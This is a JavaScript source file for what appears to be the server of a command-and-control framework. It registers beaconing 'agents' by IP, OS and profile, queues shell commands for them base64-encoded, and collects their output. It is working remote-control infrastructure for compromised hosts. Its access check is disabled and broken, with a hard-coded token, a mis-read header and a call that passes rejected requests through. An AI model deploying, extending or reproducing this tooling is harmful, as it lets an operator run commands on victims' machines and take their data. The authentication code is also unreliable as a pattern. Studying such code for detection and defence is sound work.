const express = require('express')
const bodyParser = require('body-parser')

const tasks = require('./store/tasks')
const agents = require('./store/agents')

const app = express();
const taskStore = tasks()
const agentStore = agents()

const allowCrossDomain = function (req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE')
  next()
}

const protect = (req, res, next) => {
  console.log(req.header['x-access-token'])
  if (req.header['x-access-token'] !== 'ZzVnNWc1ZzU=' && !req.url.includes('beacon')) {
    res.status(404).json({
      message: 'invalid x-access-token'
    })
  }
  next();
}

app.use(bodyParser.json())
app.use(bodyParser.text())
app.use(allowCrossDomain)
//app.use(protect)

// Interaction with agents
app.get('/api/agents', (req, res) => {
  res.status(200).json(agentStore.getAllAgents())
})

app.get('/api/agents/:agentId', (req, res) => {
  const agentId = parseInt(req.params.agentId)
  const agent = agentStore.getAgentById(agentId)
  if (agent) {
    res.status(200).json(agent)
  } else {
    res.status(404).json({
      message: 'agent does not exist'
    })
  }
})

app.put('/api/agents/:agentId/status', (req, res) => {
  const agentId = parseInt(req.params.agentId)
  agentStore.updateAgentBeaconTime(agentId)
  res.status(200).send()
})

app.get('/api/agents/:agentId/tasks', (req, res) => {
  const agentId = parseInt(req.params.agentId)
  const tasks = taskStore.getAllTasksForAgent(agentId)
  if (tasks) {
    res.status(200).json(tasks)
  } else {
    res.status(404).json({
      message: 'agent does not exist'
    })
  }
})

// Interact with tasks
app.post('/api/tasks', (req, res) => {
  const { command, agentId } = req.body
  const taskId = taskStore.addTask(command, agentId)
  res.status(200).json({
    taskId: taskId,
    agentId: agentId
  })
})

app.get('/api/tasks', (req, res) => {
  res.status(200).json(taskStore.getAllTasks())
})

app.get('/api/tasks/:taskId', (req, res) => {
  const taskId = parseInt(req.params.taskId)
  const task = taskStore.getTaskById(taskId)
  if (task) {
    res.status(200).json(task)
  } else {
    res.status(404).json({
      message: 'task does not exist'
    })
  }
})

// Beacon
app.post('/beacon', (req, res) => {
  const [ip, os, profile] = req.body.split(/\|{2}/)
  const agentId = agentStore.addAgent(os, ip, profile)
  res.status(200).send(`${agentId}`)
})

app.get('/beacon/:agentId', (req, res) => {
  const agentId = parseInt(req.params.agentId)
  const agent = agentStore.getAgentById(agentId)
  if (agent === null) {
    res.status(200).send('agent does not exist')
  } else {
    agentStore.updateAgentBeaconTime(agentId)
    const task = taskStore.getNextTaskForAgent(agentId)
    if (task) {
      res.status(200).send(`${task.id}||${Buffer.from(task.command).toString('base64')}`)
    } else {
      res.status(200).send('sleep')
    }
  }
})

app.post('/beacon/:agentId', (req, res) => {
  const agentId = parseInt(req.params.agentId)
  const agent = agentStore.getAgentById(agentId)
  if (agent === null) {
    res.status(200).send('agent does not exist')
  } else {
    agentStore.updateAgentBeaconTime(agentId)
    const [taskId, response] = req.body.split(/\|{2}/)
    taskStore.updateTaskById(parseInt(taskId), response)
    const task = taskStore.getTaskById(parseInt(taskId))
    if (task) {
      res.status(200).send('ok')
    } else {
      res.status(200).send('task does not exist')
    }
  }
})


module.exports = app